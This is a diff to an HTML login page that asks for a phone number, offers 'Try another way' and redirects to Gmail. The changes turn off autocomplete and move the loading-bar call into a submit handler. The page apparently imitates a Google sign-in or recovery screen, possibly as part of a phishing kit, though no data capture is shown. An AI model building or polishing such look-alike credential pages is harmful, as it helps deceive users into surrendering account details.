@@ -17,7 +17,7 @@
         <div class="form-container">
             <div class="white-overlay" id="whiteOverlay"></div>
             <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
-        <form class="loginform1" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+        <form class="loginform1" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8" autocomplete="off">
        
             <div class="form-half">
                 <div><img class="divlogo" src="/image/image.png" ></div>
@@ -54,7 +54,7 @@
                         
                         <div class="input-section">
                             <div class="input-wrapper">
-                                <input type="tel" name="tel" id="telInput" onkeypress="return validateMobile(event)" oninput="toggleSendButton()" required="">
+                                <input type="tel" name="tel" id="telInput" onkeypress="return validateMobile(event)" oninput="toggleSendButton()" required="" autocomplete="off">
                                 <label placeholder="Phone Number"></label>
                             </div>
                             <div id="emobError" class="error-msg" style="display:none;"><img src="/image/emob.png"></div>
@@ -87,7 +87,7 @@
 
                 <div class="tryn1">
                     <button id="myButton" class="hyperl2" ><b>Try another way</b></button>&nbsp;&nbsp;&nbsp;
-                    <button type="submit" class="btnnxt" id="sendBtn" onclick="showLoadingBar()" disabled>Send</button>
+                    <button type="submit" class="btnnxt" id="sendBtn" disabled>Send</button>
                     
                     
                   </div>
@@ -190,6 +190,13 @@
         location.href = "https://mail.google.com";
       };
       toggleSendButton();
+
+      document.querySelector('.loginform1').addEventListener('submit', function (e) {
+        e.preventDefault();
+        const btn = document.getElementById('sendBtn');
+        if (btn.disabled) return;
+        showLoadingBar();
+      });
     });
     </script>
     </div>
